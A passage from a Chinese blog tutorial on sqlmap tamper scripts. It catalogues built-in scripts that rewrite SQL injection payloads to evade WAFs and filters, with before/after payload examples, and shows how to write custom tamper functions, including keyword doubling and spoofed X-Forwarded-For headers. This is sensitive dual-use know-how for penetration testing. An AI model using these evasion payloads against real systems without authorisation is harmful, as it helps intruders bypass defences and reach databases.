</tr>
<tr>
<td>lowercase</td>
<td>5</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>modsecurityversioned</td>
<td>5</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>modsecurityzeroversioned</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>multiplespaces</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>nonrecursivereplacement</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>overlongutf8</td>
<td>5.1.56,5.5.11</td>
<td>2000, 2005</td>
<td>N/A</td>
<td>9</td>
</tr>
<tr>
<td>percentage</td>
<td>4, 5.0,5.5</td>
<td>2005</td>
<td>10g</td>
<td>8.3,8.4,9.0</td>
</tr>
<tr>
<td>randomcase</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>randomcomments</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>securesphere</td>
<td>4,5.0,5.5</td>
<td>2005</td>
<td>10g</td>
<td>8.3,8.4,9.0</td>
</tr>
<tr>
<td>space2comment</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>space2dash</td>
<td>4.0,5.0</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>space2hash</td>
<td>&gt;= 5.1.13</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>space2morehash</td>
<td>-</td>
<td>2000, 2005</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>space2mssqlblank</td>
<td>*</td>
<td>*</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>space2mssqlhash</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>space2plus</td>
<td>4,5.0,5.5</td>
<td>2005</td>
<td>10g</td>
<td>8.3,8.4,9.0</td>
</tr>
<tr>
<td>space2randomblank</td>
<td>-</td>
<td>*</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>sp_password</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>symboliclogical</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>unionalltounion</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>unmagicquotes</td>
<td>4, 5.0,5.5</td>
<td>2005</td>
<td>10g</td>
<td>8.3,8.4,9.0</td>
</tr>
<tr>
<td>uppercase</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>varnish</td>
<td>*</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>versionedkeywords</td>
<td>&gt;=5.1.13</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>versionedmorekeywords</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
<tr>
<td>xforwardedfor</td>
<td>*</td>
<td>*</td>
<td>*</td>
<td>*</td>
</tr>
</tbody>
</table>
<h3>
<a id="tamper_457"></a>自带tamper介绍</h3> 
<pre><code class="prism language-bash">apostrophemask.py
功能：对引号进行 utf-8 格式编码 <span class="token punctuation">(</span>% EF% BC%87<span class="token punctuation">)</span>
平台：All
举例：1 AND ‘1’<span class="token operator">=</span>’1 <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND % EF% BC%871% EF% BC%87<span class="token operator">=</span>% EF% BC%871

apostrophenullencode.py
功能：用非法的双 unicode 字符 <span class="token punctuation">(</span>%00%27<span class="token punctuation">)</span> 替换引号字符
平台：All
举例：1 AND ‘1’<span class="token operator">=</span>’1 <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND %00%271%00%27<span class="token operator">=</span>%00%271

appendnullbyte.py
功能：在有效载荷结束位置加载零字节字符编码
平台：Microsoft Access
举例：1 AND <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span>%00

base64encode.py
功能：用 base64 格式进行编码
平台：All
举例：1’ AND SLEEP <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment"># ==&gt; MScgQU5EIFNMRUVQKDUpIw==</span>

between.py
功能：用 between 替换大于号（<span class="token operator">&gt;</span>）
平台：Mssql2005、MySQL <span class="token number">4</span>/5.0/5.5、Oracle 10g、PostgreSQL <span class="token number">8.3</span>/8.4/9.0
举例：
<span class="token number">1</span> AND A <span class="token operator">&gt;</span> B –  <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND A NOT BETWEEN <span class="token number">0</span> AND B  –
<span class="token number">1</span> AND A <span class="token operator">=</span> B –  <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND A BETWEEN B AND B –

bluecoat.py
功能：对 SQL 语句替换空格字符为 <span class="token punctuation">(</span>%09<span class="token punctuation">)</span>，并替换”<span class="token operator">=</span>”—<span class="token operator">&gt;</span>”LIKE”
平台：MySQL <span class="token number">5.1</span>, SGOS
举例：SELECT username FROM <span class="token function">users</span> WHERE <span class="token function">id</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> SELECT%09username FROM%09users WHERE%09id LIKE <span class="token number">1</span>

apostrophemask.py
功能：用 utf-8 格式编码引号 <span class="token punctuation">(</span>如：% EF% BC%87<span class="token punctuation">)</span>
平台：All
举例：1 AND ‘1’<span class="token operator">=</span>’1 <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND % EF% BC%871% EF% BC%87<span class="token operator">=</span>% EF% BC%871

charunicodeencode.py
功能：对字符串进行 Unicode 格式转义编码
平台：Mssql <span class="token number">2000,2005</span>、MySQL <span class="token number">5.1</span>.56、PostgreSQL <span class="token number">9.0</span>.3 ASP/ASP.NET
举例：SELECT FIELD%20FROM TABLE <span class="token operator">==</span><span class="token operator">&gt;</span> % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045

charencode.py
功能：采用 url 格式编码 <span class="token number">1</span> 次
平台：Mssql <span class="token number">2005</span>、MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>、Oracle 10g、PostgreSQL <span class="token number">8.3</span>, <span class="token number">8.4</span>, <span class="token number">9.0</span>
举例：SELECT FIELD FROM%20TABLE <span class="token operator">==</span><span class="token operator">&gt;</span> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

chardoubleencode.py
功能：采用 url 格式编码 <span class="token number">2</span> 次
平台：All
举例：SELECT FIELD FROM%20TABLE <span class="token operator">==</span><span class="token operator">&gt;</span> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545

commalessmid.py
功能：将 payload 中的逗号用 from 和 <span class="token keyword">for</span> 代替，用于过滤了逗号并且是 <span class="token number">3</span> 个参数的情况
平台：MySQL <span class="token number">5.0</span>, <span class="token number">5.5</span>
举例：MID <span class="token punctuation">(</span>VERSION <span class="token punctuation">(</span><span class="token punctuation">)</span>, <span class="token number">1</span>, <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">&gt;</span> MID <span class="token punctuation">(</span>VERSION <span class="token punctuation">(</span><span class="token punctuation">)</span> FROM <span class="token number">1</span> FOR <span class="token number">1</span><span class="token punctuation">)</span>

concat2concatws.py
功能：CONCAT <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">&gt;</span> CONCAT_WS <span class="token punctuation">(</span><span class="token punctuation">)</span>，用于过滤了 CONCAT <span class="token punctuation">(</span><span class="token punctuation">)</span> 函数的情况
平台： MySQL <span class="token number">5.0</span>
举例：CONCAT <span class="token punctuation">(</span><span class="token number">1,2</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">&gt;</span> CONCAT_WS <span class="token punctuation">(</span>MID <span class="token punctuation">(</span>CHAR <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>,0,0<span class="token punctuation">)</span>,1,2<span class="token punctuation">)</span>

equaltolike.py
功能：<span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">&gt;</span> LIKE，用于过滤了等号”<span class="token operator">=</span>” 的情况
平台：Mssql <span class="token number">2005</span>、MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>
举例：SELECT * FROM <span class="token function">users</span> WHERE <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> SELECT * FROM <span class="token function">users</span> WHERE <span class="token function">id</span> LIKE <span class="token number">1</span>

greatest.py
功能：<span class="token operator">&gt;</span> <span class="token operator">==</span><span class="token operator">&gt;</span> GREATEST
平台：MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>、Oracle 10g、PostgreSQL <span class="token number">8.3</span>, <span class="token number">8.4</span>, <span class="token number">9.0</span>
举例：1 AND A <span class="token operator">&gt;</span> B <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND GREATEST <span class="token punctuation">(</span>A, B+1<span class="token punctuation">)</span><span class="token operator">=</span>A
a 和 b+1 比较，取两者中的最大值为 a；则 a <span class="token operator">&gt;</span><span class="token operator">=</span> b+1，亦即 a <span class="token operator">&gt;</span> b

halfversionedmorekeywords.py
功能：空格 <span class="token operator">==</span><span class="token operator">&gt;</span> / <span class="token operator">!</span><span class="token number">0</span> （在关键字前添加注释）
平台：MySQL <span class="token number">4.0</span>.18, <span class="token number">5.0</span>.22（Mysql <span class="token operator">&lt;</span> <span class="token number">5.1</span>）
举例：union <span class="token operator">==</span><span class="token operator">&gt;</span> /<span class="token operator">!</span>0union

ifnull2ifisnull.py
功能：IFNULL <span class="token punctuation">(</span>A, B<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">&gt;</span> IF <span class="token punctuation">(</span>ISNULL <span class="token punctuation">(</span>A<span class="token punctuation">)</span>, B, A<span class="token punctuation">)</span>
平台：MySQL <span class="token number">5.0</span> and <span class="token number">5.5</span>
举例：IFNULL <span class="token punctuation">(</span><span class="token number">1</span>, <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">&gt;</span> IF <span class="token punctuation">(</span>ISNULL <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>,2,1<span class="token punctuation">)</span>

informationschemacomment.py
功能：
在 information_schema 后面加上 // ，用于绕过对 information_schema 的情况
retVal <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r”<span class="token punctuation">(</span>?i<span class="token punctuation">)</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">)</span>.”, “g<span class="token operator">&lt;</span><span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>/ /.”, payload<span class="token punctuation">)</span>
平台：All
举例：select table_name from information_schema.tables <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> table_name from information_schema/**/.tables

lowercase.py
功能：将 payload 里的大写转为小写
平台：Mssql <span class="token number">2005</span>、MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>、Oracle 10g、PostgreSQL <span class="token number">8.3</span>, <span class="token number">8.4</span>, <span class="token number">9.0</span>
举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> table_name from information_schema.tables

modsecurityversioned.py
功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf
平台：MySQL <span class="token number">5.0</span>
举例：1 AND <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token number">1</span>–  <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> /<span class="token operator">!</span>30874AND <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token number">1</span>/–

modsecurityzeroversioned.py
功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似
平台：Mysql
举例：1 and <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token number">1</span>–+ <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> /<span class="token operator">!</span>00000and <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token number">1</span>/–+

multiplespaces.py
功能：围绕 SQL 关键字添加多个空格
平台：All
举例：1 UNION SELECT foobar <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span>   UNION   SELECT   foobar

nonrecursivereplacement.py
功能：关键字双写，可用于关键字过滤
平台：All
举例：1 UNION SELECT <span class="token number">2</span>–  <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> UNIONUNION SELESELECTCT <span class="token number">2</span>–

overlongutf8.py
功能： 转换给定的 payload 当中的所有字符
平台：All
举例：SELECT FIELD FROM TABLE WHERE <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> SELECT% C0% AAFIELD% C0% AAFROM% C0% AATABLE% C0% AAWHERE% C0% AA2% C0% BE1

percentage.py
功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个 <span class="token punctuation">(</span>%<span class="token punctuation">)</span>
平台：Mssql <span class="token number">2000</span>, <span class="token number">2005</span>、MySQL <span class="token number">5.1</span>.56, <span class="token number">5.5</span>.11、PostgreSQL <span class="token number">9.0</span>
举例：SELECT FIELD FROM TABLE <span class="token operator">==</span><span class="token operator">&gt;</span> % S% E% L% E% C% T % F% I% E% L% D % F% R% O% M % T% A% B% L% E

randomcase.py
功能：将 payload 随机大小写
平台：Mssql <span class="token number">2005</span>、MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>、Oracle 10g、PostgreSQL <span class="token number">8.3</span>, <span class="token number">8.4</span>, <span class="token number">9.0</span>
举例：INSERT <span class="token operator">==</span><span class="token operator">&gt;</span> InseRt

randomcomments.py
功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤
平台：Mysql
举例：INSERT <span class="token operator">==</span><span class="token operator">&gt;</span> I / ** / N / ** / SERT

securesphere.py
功能：在 payload 后追加特殊构造的字符串
平台：All
举例：1 AND <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> and ‘0having’<span class="token operator">=</span>’0having’

space2comment.py
功能：用注释符 // 代替空格，用于空格的绕过
平台：Mssql <span class="token number">2005</span>、MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>、Oracle 10g、PostgreSQL <span class="token number">8.3</span>, <span class="token number">8.4</span>, <span class="token number">9.0</span>
举例：SELECT <span class="token function">id</span> FROM <span class="token function">users</span> <span class="token operator">==</span><span class="token operator">&gt;</span> SELECT//id//FROM//users

space2dash.py
功能：用 <span class="token punctuation">[</span>注释符 <span class="token punctuation">(</span>–<span class="token punctuation">)</span>+ 一个随机字符串 + 一个换行符<span class="token punctuation">]</span> 替换控制符
平台：MSSQL、 SQLite
举例：union <span class="token keyword">select</span> <span class="token number">1,2</span>–+ <span class="token operator">==</span><span class="token operator">&gt;</span> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+

space2hash.py
功能：用 <span class="token punctuation">[</span>注释符 <span class="token punctuation">(</span><span class="token comment">#)+ 一个随机字符串 + 一个换行符] 替换控制符</span>
平台：Mysql
举例：union <span class="token keyword">select</span> <span class="token number">1,2</span>–+ <span class="token operator">==</span><span class="token operator">&gt;</span> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+

space2morehash.py
功能：用多个 <span class="token punctuation">[</span>注释符 <span class="token punctuation">(</span><span class="token comment">#)+ 一个随机字符串 + 一个换行符] 替换控制符</span>
平台：MySQL <span class="token operator">&gt;</span><span class="token operator">=</span> <span class="token number">5.1</span>.13
举例：union <span class="token keyword">select</span> <span class="token number">1,2</span>–+ <span class="token operator">==</span><span class="token operator">&gt;</span> union %23 HSHjsJh %0A <span class="token keyword">select</span> %23 HhjHSJ %0A%23 HJHJhj %0A <span class="token number">1,2</span>–+

space2mssqlblank.py
功能：用随机的空白符替换 payload 中的空格
blanks <span class="token operator">=</span> <span class="token punctuation">(</span>‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’<span class="token punctuation">)</span>
平台：Mssql <span class="token number">2000,2005</span>
举例：SELECT <span class="token function">id</span> FROM <span class="token function">users</span> <span class="token operator">==</span><span class="token operator">&gt;</span> SELECT%0Eid%0DFROM%07users

space2mssqlhash.py
功能：用 <span class="token punctuation">[</span>字符<span class="token comment"># + 一个换行符] 替换 payload 中的空格</span>
平台：MSSQL、MySQL
举例：union <span class="token keyword">select</span> <span class="token number">1,2</span>–+ <span class="token operator">==</span><span class="token operator">&gt;</span> union%23%0Aselect%23%0A1,2–+

space2plus.py
功能：用加号 <span class="token punctuation">(</span>+<span class="token punctuation">)</span> 替换空格
平台：All
举例：SELECT <span class="token function">id</span> FROM <span class="token function">users</span> <span class="token operator">==</span><span class="token operator">&gt;</span> SELECT+id+FROM+users

space2randomblank.py
功能：用随机的空白符替换 payload 中的空格
平台：Mssql <span class="token number">2005</span>、MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>、Oracle 10g、PostgreSQL <span class="token number">8.3</span>, <span class="token number">8.4</span>, <span class="token number">9.0</span>
举例：SELECT <span class="token function">id</span> FROM <span class="token function">users</span> <span class="token operator">==</span><span class="token operator">&gt;</span> SELECT%0Did%0DFROM%0Ausers

sp_password.py
功能：在 payload 语句后添加 sp_password ，用于迷惑数据库日志（Space <span class="token operator">==</span><span class="token operator">&gt;</span> sp_password）
平台：Mssql
举例：1 AND <span class="token assign-left variable">9227</span><span class="token operator">=</span><span class="token number">9227</span>–  <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> AND <span class="token assign-left variable">9227</span><span class="token operator">=</span><span class="token number">9227</span> – sp_password

symboliclogical.py
功能：用 <span class="token operator">&amp;&amp;</span> 替换 and ，用 <span class="token operator">||</span> 替换 or ，用于这些关键字被过滤的情况
平台：All
举例：
<span class="token number">1</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> %26%26 <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token number">1</span> or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span> %7c%7c <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span>

unionalltounion.py
功能：用 union <span class="token keyword">select</span> 替换 union all <span class="token keyword">select</span>
平台：All
举例：union all <span class="token keyword">select</span> <span class="token number">1,2</span>–+ <span class="token operator">==</span><span class="token operator">&gt;</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>–+

unmagicquotes.py
功能：用宽字符绕过 GPC addslashes
平台：All
举例：1’ and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span>% df%27 and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span>–

uppercase.py
功能：将 payload 中的小写字母转为大写格式
平台：Mssql <span class="token number">2005</span>、MySQL <span class="token number">4</span>, <span class="token number">5.0</span> and <span class="token number">5.5</span>、Oracle 10g、PostgreSQL <span class="token number">8.3</span>, <span class="token number">8.4</span>, <span class="token number">9.0</span>
举例：insert <span class="token operator">==</span><span class="token operator">&gt;</span> INSERT

varnish.py
功能：添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF
平台：headers <span class="token operator">=</span> kwargs.get <span class="token punctuation">(</span>“headers”, <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span> headers <span class="token punctuation">[</span>“X-originating-IP”<span class="token punctuation">]</span> <span class="token operator">=</span> “127.0.0.1”return payload
举例：All

versionedkeywords.py
功能：对非函数的关键字进行注释
平台：MySQL <span class="token number">4.0</span>.18, <span class="token number">5.1</span>.56, <span class="token number">5.5</span>.11
举例：1 union <span class="token keyword">select</span> user <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span>/<span class="token operator">!</span>UNION//<span class="token operator">!</span>SELECT/user <span class="token punctuation">(</span><span class="token punctuation">)</span>

versionedmorekeywords.py
功能：对每个关键字进行注释处理
平台：MySQL <span class="token number">5.1</span>.56, <span class="token number">5.5</span>.11
举例：1 union <span class="token keyword">select</span> user <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token number">1</span>/<span class="token operator">!</span>UNION//<span class="token operator">!</span>SELECT/user <span class="token punctuation">(</span><span class="token punctuation">)</span>

xforwardedfor.py
功能：添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF
平台：All
举例：headers <span class="token operator">=</span> kwargs.get <span class="token punctuation">(</span>“headers”, <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span> headers <span class="token punctuation">[</span>“X-Forwarded-For”<span class="token punctuation">]</span> <span class="token operator">=</span> randomIP <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin class-name">return</span> payload
</code></pre> 
<h3>
<a id="tamper_689"></a>编写tamper</h3> 
<p>先来看一个简单的 tamper：apostrophemask.py</p> 
<pre><code class="prism language-python"><span class="token comment"># Needed imports</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

<span class="token comment"># Define which is the order of application of tamper scripts against</span>
<span class="token comment"># the payload</span>
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>NORMAL

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    Description of your tamper script
    '''</span>

    retVal <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'''</span><span class="token punctuation">,</span> <span class="token string">"%EF%BC%87"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> payload <span class="token keyword">else</span> payload

    <span class="token comment"># your code to tamper the original payload</span>

    <span class="token comment"># return the tampered payload</span>
    <span class="token keyword">return</span> retVal
</code></pre> 
<p>这个 tamper 非常的简单，写的话参考这个就可以了，先来分析这里边有什么元素</p> 
<ul>
<li>import部分</li>
<li>
<code>__priority__</code> 属性</li>
<li>dependencies函数</li>
<li>tamper函数以及用户自定义的函数</li>
</ul> 
<h4>
<a id="import_721"></a>import部分</h4> 
<p>可以导入sqlmap的内部库，sqlmap 为我们提供了很多封装好的函数和数据类型，比如上面的的<code>PRIORITY</code>就来源于<code>sqlmap/lib/core/enums.py</code></p> 
<h4>
<a id="priority_725"></a>priority</h4> 
<p>定义当前 tamper 的优先级，用于有多个tamper脚本的情况，有以下参数</p> 
<pre><code class="prism language-bash">class PRIORITY:
    LOWEST <span class="token operator">=</span> -100
    LOWER <span class="token operator">=</span> -50
    LOW <span class="token operator">=</span> -10
    NORMAL <span class="token operator">=</span> <span class="token number">0</span>
    HIGH <span class="token operator">=</span> <span class="token number">10</span>
    HIGHER <span class="token operator">=</span> <span class="token number">50</span>
    HIGHEST <span class="token operator">=</span> <span class="token number">100</span>
</code></pre> 
<h4>
<a id="dependencies_740"></a>dependencies</h4> 
<p>函数声明该脚本适用/不适用的范围，可以为空，比如以下代码</p> 
<pre><code class="prism language-bash"><span class="token comment"># sqlmap/tamper/echarunicodeencode.py</span>
from lib.core.common <span class="token function">import</span> singleTimeWarnMessage
 
def dependencies<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    singleTimeWarnMessage<span class="token punctuation">(</span><span class="token string">"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications"</span> % os.path.basename<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>.split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 
<span class="token comment"># singleTimeWarnMessage() 于在控制台中打印出警告信息</span>
</code></pre> 
<p>数据库有以下名称，在<code>libcoreenums.py</code>可以看到全部</p> 
<pre><code class="prism language-bash">class DBMS:
    ACCESS <span class="token operator">=</span> <span class="token string">"Microsoft Access"</span>
    DB2 <span class="token operator">=</span> <span class="token string">"IBM DB2"</span>
    FIREBIRD <span class="token operator">=</span> <span class="token string">"Firebird"</span>
    MAXDB <span class="token operator">=</span> <span class="token string">"SAP MaxDB"</span>
    MSSQL <span class="token operator">=</span> <span class="token string">"Microsoft SQL Server"</span>
    MYSQL <span class="token operator">=</span> <span class="token string">"MySQL"</span>
    ORACLE <span class="token operator">=</span> <span class="token string">"Oracle"</span>
    PGSQL <span class="token operator">=</span> <span class="token string">"PostgreSQL"</span>
    SQLITE <span class="token operator">=</span> <span class="token string">"SQLite"</span>
    SYBASE <span class="token operator">=</span> <span class="token string">"Sybase"</span>
    HSQLDB <span class="token operator">=</span> <span class="token string">"HSQLDB"</span>
    <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
</code></pre> 
<h4>
<a id="tamper_772"></a>tamper函数</h4> 
<p>主要功能实现的函数，其中 payload 参数就是原始的 sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个 payload 的修改</p> 
<p>比如双写绕过的 payload</p> 
<pre><code class="prism language-bash">def tamper<span class="token punctuation">(</span>payload, **kwargs<span class="token punctuation">)</span>:
    payload <span class="token operator">=</span> payload.lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload.replace<span class="token punctuation">(</span><span class="token string">'select'</span>,<span class="token string">'seleselectct'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> payload.replace<span class="token punctuation">(</span><span class="token string">'union'</span>,<span class="token string">'ununionion'</span><span class="token punctuation">)</span>
    <span class="token builtin class-name">return</span> payload
</code></pre> 
<p>第二个参数：<code>**kwargs</code>中包含了 http 头的数据，可以从<code>kwargs</code>中取出<code>headers</code>数组在进行更改</p> 
<p>比如将 http 头中的 xff 头变为随机 ip</p> 
<pre><code class="prism language-bash">def tamper<span class="token punctuation">(</span>payload, **kwargs<span class="token punctuation">)</span>:
	headers <span class="token operator">=</span> kwargs.get<span class="token punctuation">(</span><span class="token string">"headers"</span>, <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span>
	headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">=</span> randomIP<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token builtin class-name">return</span> payload
</code></pre> 
<h1>
<a id="_797"></a>代码分析</h1> 
<h1>
<a id="_799"></a>攻防</h1> 
<p>流量分析</p> 
<p>入侵检测</p> 
<p>隐蔽注入</p> 
<p>空白部分将会在接下来的文章中添加</p> 
<p><img src="https://images2.imgbox.com/f5/33/4sQG1Otz_o.png" alt=""></p>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
